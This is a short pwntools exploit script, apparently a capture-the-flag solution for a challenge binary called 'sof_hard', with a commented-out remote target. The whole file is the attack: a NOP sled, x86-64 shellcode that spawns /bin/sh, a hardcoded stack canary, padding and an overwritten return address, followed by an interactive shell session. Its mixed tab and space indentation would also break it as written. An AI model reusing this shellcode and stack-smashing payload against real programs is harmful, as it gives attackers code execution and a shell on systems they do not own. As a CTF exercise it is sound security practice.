from pwn import *

shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


Canary = 0x4541af8e403f2abc
ret = 0x7fffffffe3a8

if __name__ == '__main__':
        s = process('./sof_hard')
#        s = remote('singi.io', 1337)

        payload = '\x90'*(128- len(shell))
	payload += shell
	payload += p64(Canary)
	payload += 'B' * 0x10
	payload += p64(ret)

        s.send(payload)
        sleep(1)

	pause()

	s.interactive()
        s.close()

